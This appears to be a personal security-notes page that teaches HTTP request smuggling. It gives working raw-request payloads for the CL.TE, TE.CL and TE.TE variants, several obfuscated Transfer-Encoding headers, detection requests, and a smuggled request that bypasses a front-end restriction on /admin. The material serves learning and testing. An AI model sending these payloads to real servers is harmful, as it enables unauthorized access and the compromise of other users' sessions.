---
title: HTTP Request Smuggling
category: Web
order: 26
---

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. 

![HTTP Request Smuggling](/hackingnotes/images/smuggling.png)

Request smuggling is primarily associated with **HTTP/1 requests**.

Most HTTP request smuggling vulnerabilities arise because the `HTTP/1` specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header. 

* **Content-Length**: It specifies the length of the message body in bytes.

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

* **Trasnfer-Encoding**: It specifies thatthe message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes expressed in **hexadecimal**, followed by a new line, followed by the chunk contents and it's terminated with a size zero.

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

Since HTTP/1 has two differents methods for specifyng the length of HTTP message, it is possible for a single message to use both methods at once.

* **CL.TE**: The front-end server uses the `Content-Lenght` header and the back-end server uses the `Transfer-Encoding` header.
* **TE.CL**: The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
* **TE.TE**: Both servers support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

# Burpuiste Setup for smuggling attacks

At first we need to download `HTTP Request Smuggler` burp extension may be we can use it. It has a usefull scanner.

We should do this on every request on the repeater tab.

1. Downgrade the protocol to HTTP/1.1.
![HTTP Request Smuggling](/hackingnotes/images/smuggling-downgrade.png)
2. Disable `Update Content-Length`
![HTTP Request Smuggling](/hackingnotes/images/smuggling-update.png)
3. Turn on `Non printable characters`
![HTTP Request Smuggling](/hackingnotes/images/smuggling-linebreak.png)

# CL.TE

Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows: 

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0\r\n
\r\n
SMUGGLED

```

![HTTP Request Smuggling](/hackingnotes/images/smuggling-clte.png)

# TE.CL

The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. We can perform a simple HTTP request smuggling attack as follows: 

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\n
SMUGGLED\r\n
0\r\n
\r\n

```

![HTTP Request Smuggling](/hackingnotes/images/smuggling-tecl.png)


# TE.TE

The front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

Here we can see some ways to obfuscate the `Transfer-Encoding` header:

```
Transfer-encoding: cow
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

The exploitation is similar to `TE.CL` but we need to add two `Transfer-Encoding` headers but one obfuscated.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

8\r\n
SMUGGLED\r\n
0\r\n
\r\n

```


# Finding Smuggling Vulnerabilities

The best way to find smuggling is to execute the following two tests:

![HTTP Request Smuggling](/hackingnotes/images/smuggling2.png)

To confirm the vulnerability we can send two requests to the application in quick succession:

* An "attack" request that is designed to interfere with the processing of the next request.
* A "normal" request.

If the response to the normal request contains the expected interference, then the vulnerability is confirmed.

For example, suppose the normal request looks like this: 

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

## Confirming CL.TE

To confirm a CL.TE vulnerability, you would send an attack request like this: 

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smugglifOOng&x=
0

GET /404 HTTP/1.1
Foo: x
```

![HTTP Request Smuggling](/hackingnotes/images/smuggling-confirming-clte.png)

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

## Confirming TE.CL

To confirm a TE.CL vulnerability, you would send an attack request like this: 


```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

![HTTP Request Smuggling](/hackingnotes/images/smuggling-confirming-tecl.png)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

# Exploiting HTTP Request smuggling Vulnerabilities

## Using smuggling to bypass front-end security controls

Suppose the current user is permitted to access `/home` but not `/admin`. They can bypass this restriction using the following request smuggling attack: 

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```